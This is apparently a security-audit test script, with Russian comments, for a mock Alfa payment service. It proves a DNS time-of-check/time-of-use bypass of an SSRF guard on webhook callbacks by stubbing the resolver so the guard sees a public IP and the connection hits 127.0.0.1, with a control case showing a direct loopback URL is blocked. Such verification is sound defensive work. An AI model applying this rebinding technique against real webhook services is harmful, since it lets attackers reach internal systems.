#!/usr/bin/env node
// SZ-ALFA аддендум (post-#55): §7.3 DNS TOCTOU на живой delivery-очереди АЛЬФА-адаптера.
// Альфа доставляет callbacks через core.createDeliveryQueue (server.js:496-521) -> core postJson
// (781-788): assertPublicHost (984-1016) резолвит имя ОДИН раз, http.request — ВТОРОЙ раз.
// Подмена resolver'а в одном процессе: guard видит 93.184.216.34 (public), connect — 127.0.0.1.
// MOCK_HOSTED=1 -> BLOCK_PRIVATE_WEBHOOKS=true (гард ВКЛЮЧЁН — доставка доказывает обход).
// Контроль: тот же фикстур по прямому 127.0.0.1 в callback_url блокируется (SSRF_BLOCKED).
'use strict';
process.env.MOCK_HOSTED = '1';
process.env.MOCK_TENANCY = 'owned';
process.env.MOCK_SANDBOX_CREATE_LIMIT = '0';
process.env.MOCK_STATE_FILE = '';
process.env.MOCK_SANDBOX_FILE = '';

const dns = require('node:dns'), http = require('node:http');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const REPO = require('node:path').resolve(__dirname, '..', '..', '..', '..');
const svc = require(REPO + '/services/alfa-mock/server.js');
const REBIND = 'rebind.audit.test';
const origPL = dns.promises.lookup, origL = dns.lookup;
let guardLookups = 0, connectLookups = 0, hits = 0, lastHit = '';
const fixture = http.createServer((q, s) => { q.resume(); q.on('end', () => { hits += 1; lastHit = q.url; s.end('OK'); }); });

function req(port, method, url, headers = {}, form = null) {
  return new Promise((resolve, reject) => {
    const data = form ? new URLSearchParams(form).toString() : null;
    const h = { ...headers };
    if (data) { h['Content-Length'] = Buffer.byteLength(data); h['Content-Type'] = 'application/x-www-form-urlencoded'; }
    const r = http.request({ host: '127.0.0.1', port, method, path: url, headers: h, timeout: 5000 }, (res) => {
      let b = ''; res.on('data', (c) => { b += c; }); res.on('end', () => resolve({ status: res.statusCode, json: (() => { try { return JSON.parse(b); } catch { return null; } })(), body: b }));
    });
    r.on('error', reject);
    if (data) r.write(data); r.end();
  });
}

(async () => {
  await new Promise((ok) => fixture.listen(0, '127.0.0.1', ok));
  const fport = fixture.address().port;
  await new Promise((ok) => svc.server.listen(0, '127.0.0.1', ok));
  const port = svc.server.address().port;
  const cbUrl = `http://${REBIND}:${fport}/hook`;

  // ── фаза 1: подмена resolver'а (гард hosted ВКЛЮЧЁН) ──
  dns.promises.lookup = async (host, options) => {
    if (host === REBIND) { guardLookups += 1; return [{ address: '93.184.216.34', family: 4 }]; }
    return origPL(host, options);
  };
  dns.lookup = function (host, options, callback) {
    if (typeof options === 'function') { callback = options; options = {}; }
    if (host === REBIND) {
      connectLookups += 1;
      const ip = { address: '127.0.0.1', family: 4 };
      return process.nextTick(() => (options && options.all ? callback(null, [ip]) : callback(null, ip.address, ip.family)));
    }
    return origL.call(dns, host, options, callback);
  };

  const reg1 = await req(port, 'POST', '/payment/rest/register.do', {}, {
    userName: 'ALFAMOCKTEST', password: 'mockpass123', orderNumber: 'toctou-1', amount: '2000',
    returnUrl: 'https://shop.test/ok', jsonParams: JSON.stringify({ callback_url: cbUrl }),
  });
  const pay1 = await req(port, 'POST', `/payment/${reg1.json.orderId}/pay`, {}, { pan: '4111111111111111', exp: '1234', cvv: '123', cardholder: 'TEST USER' });
  const tds1 = await req(port, 'POST', `/payment/${reg1.json.orderId}/3ds`, {}, { password: '12345678' });
  await sleep(3200); // тик очереди каждые 1000 мс

  // ── фаза 2: контроль — честный DNS; прямой loopback в callback_url ──
  dns.promises.lookup = origPL; dns.lookup = origL;
  const reg2 = await req(port, 'POST', '/payment/rest/register.do', {}, {
    userName: 'ALFAMOCKTEST', password: 'mockpass123', orderNumber: 'toctou-2', amount: '2000',
    returnUrl: 'https://shop.test/ok', jsonParams: JSON.stringify({ callback_url: `http://127.0.0.1:${fport}/direct` }),
  });
  const pay2 = await req(port, 'POST', `/payment/${reg2.json.orderId}/pay`, {}, { pan: '4111111111111111', exp: '1234', cvv: '123', cardholder: 'TEST USER' });
  const tds2 = await req(port, 'POST', `/payment/${reg2.json.orderId}/3ds`, {}, { password: '12345678' });
  await sleep(3200);

  const rec = svc.sandboxRuntime.find('default');
  const cbs = Object.values((rec && rec.state && rec.state.callbacks) || {});
  const entry = (n) => cbs.find((c) => c.orderId === n) || {};
  const e1 = entry(reg1.json.orderId), e2 = entry(reg2.json.orderId);
  console.log(JSON.stringify({
    register1: reg1.status, pay1: pay1.status, tds1: tds1.status,
    register2: reg2.status, pay2: pay2.status, tds2: tds2.status,
    guardLookups, connectLookups,
    fixtureHits: hits, lastHit,
    toctouEntry: { done: Boolean(e1.done), attempts: e1.attempts, url: (e1.url || '').slice(0, 48) },
    directLoopbackEntry: { done: Boolean(e2.done), attempts: e2.attempts, lastStatus: e2.lastStatus ?? null, dumped: Boolean(e2.dumped) },
  }));
  svc.server.closeAllConnections && svc.server.closeAllConnections();
  await new Promise((ok) => svc.server.close(ok)); fixture.closeAllConnections && fixture.closeAllConnections();
  await new Promise((ok) => fixture.close(ok));
  dns.promises.lookup = origPL; dns.lookup = origL;
})().catch((e) => { dns.promises.lookup = origPL; dns.lookup = origL; console.error(e); process.exitCode = 1; });
